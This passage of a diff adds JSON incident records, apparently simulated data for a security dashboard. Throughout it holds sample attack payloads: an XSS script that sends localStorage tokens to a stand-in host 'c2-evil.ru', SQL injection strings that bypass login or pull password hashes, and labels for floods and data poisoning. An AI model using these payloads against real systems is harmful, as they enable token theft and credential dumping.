+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:39:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295789316",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:39:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295787312",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:39:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295783284",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:39:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295779265",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:39:39",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295773237",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:39:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295771226",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:39:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295767224",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:39:27",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295765209",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:39:25",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295763202",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:39:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295759193",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:39:19",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295757181",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:39:17",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295753160",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:39:13",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295751160",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:39:11",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295749150",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:39:09",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295745142",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:39:05",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295743128",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:39:03",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295741126",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:39:01",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295739118",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:38:59",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295733110",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:38:53",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295731095",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:38:51",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295729094",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:38:49",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295727091",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:38:47",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295725078",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:38:45",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295723075",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:38:43",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295717045",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:38:37",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295715045",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:38:35",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295713043",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:38:33",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295711037",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:38:31",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295703010",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:38:23",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295701009",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:38:21",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295698996",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:38:18",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295696993",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:38:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295690979",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:38:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295688965",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:38:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295686963",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:38:06",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295682953",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:38:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295674924",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:37:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295664892",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:37:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295662885",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:37:42",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295656866",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:37:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295654851",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:37:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295652849",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:37:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295640813",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:37:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295638803",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:37:18",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295636801",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:37:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295634795",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:37:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295632785",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:37:12",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295630773",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:37:10",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295622745",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:37:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295614717",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:36:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295610690",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:36:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295608690",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:36:48",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295606681",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:36:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295600660",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:36:40",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295598645",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:36:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295596645",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:36:36",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295594645",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:36:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295592631",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:36:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295590619",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:36:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295588618",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:36:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295582597",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:36:22",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295580596",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:36:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295578582",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:36:18",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295574566",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:36:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295572559",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:36:12",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295564531",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:36:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295562530",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:36:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295560515",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:36:00",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295558510",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:35:58",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295556498",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:35:56",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295554497",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:35:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295552490",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:35:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295548480",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:35:48",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295546466",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:35:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295544463",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:35:44",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295542450",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:35:42",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295540449",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:35:40",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295534430",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:35:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295532415",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:35:32",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295530414",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:35:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295528415",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:35:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295526413",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:35:26",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295522394",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:35:22",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295516372",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:35:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295514364",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<img src=x onerror=alert(document.domain)>",
+      "time": "19:35:14",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295508340",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:35:08",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295506338",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:35:06",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295504333",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:35:04",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295502321",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:35:02",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295496305",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:34:56",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295494306",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:34:54",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295492302",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:34:52",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295490290",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:34:50",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295488290",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:34:48",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295486281",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:34:46",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295478253",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:34:38",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295474228",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:34:34",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295470208",
+      "ip": "185.220.101.5",
+      "type": "XSS",
+      "payload": "<script>fetch('https://c2-evil.ru/exfil?token='+localStorage.token)</script>",
+      "time": "19:34:30",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295468208",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT * FROM accounts WHERE user = 'admin' OR '1'='1' --",
+      "time": "19:34:28",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295466198",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:34:26",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295462190",
+      "ip": "45.33.32.156",
+      "type": "SQLI",
+      "payload": "SELECT id FROM items UNION SELECT 1, password_hash FROM sys_users",
+      "time": "19:34:22",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295460178",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:34:20",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295456161",
+      "ip": "103.145.13.2",
+      "type": "DDOS",
+      "payload": "SYN_FLOOD_BURST: 120000 pkts/s target:80",
+      "time": "19:34:16",
+      "action": "REAL-TIME SOC INTERCEPT",
+      "severity": "HIGH"
+    },
+    {
+      "id": "inc-1791295452145",
+      "ip": "91.240.118.17",
+      "type": "POISONING",
+      "payload": "ADVERSARIAL_PERTURBATION: matrix_delta [0.94, -0.38, 0.72] label_poison",
+      "time": "19:34:12",
